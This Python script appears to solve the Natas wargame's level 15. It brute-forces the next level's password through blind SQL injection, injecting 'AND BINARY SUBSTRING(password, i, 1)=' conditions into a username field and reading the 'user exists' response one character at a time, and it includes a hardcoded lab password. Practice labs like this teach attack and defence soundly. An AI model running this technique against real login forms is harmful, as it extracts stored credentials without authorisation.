import natasX

natas = natasX

#print(natas.natasX(15, "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J", endpoint="index.php?debug=yes", data={"username": "natas16\" AND SUBSTRING(password, 1, 1)=\"W"}).text)

w = ""

for i in range(1,70):

    for n in range(26):
        if natas.natasX(
                15,
                "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
                endpoint="index.php?debug=yes",
                param={"username": f'natas16\" AND BINARY SUBSTRING(password, {i}, {1})=\"{chr(65 + n)}'}).text.__contains__("<br>This user exists.<br>"):
            print(f'{i} {chr(65+n)}')
            w += chr(65+n)
            break

        if natas.natasX(
                15,
                "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
                endpoint="index.php?debug=yes",
                param={"username": f'natas16\" AND BINARY SUBSTRING(password, {i}, {1})=\"{chr(97 + n)}'}).text.__contains__("<br>This user exists.<br>"):
            print(f'{i} {chr(97+n)}')
            w += chr(97 + n)
            break

    if not len(w).__eq__(i):
        for k in range(0, 10):
            if natas.natasX(
                    15,
                    "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
                    endpoint="index.php?debug=yes",
                    param={"username": f'natas16\" AND SUBSTRING(password, {i}, {1})=\"{chr(48 + k)}'}).text.__contains__("<br>This user exists.<br>"):
                print(f'{i} {chr(48 + k)}')
                w += chr(48 + k)

    if len(w) < i:
        break

print(w)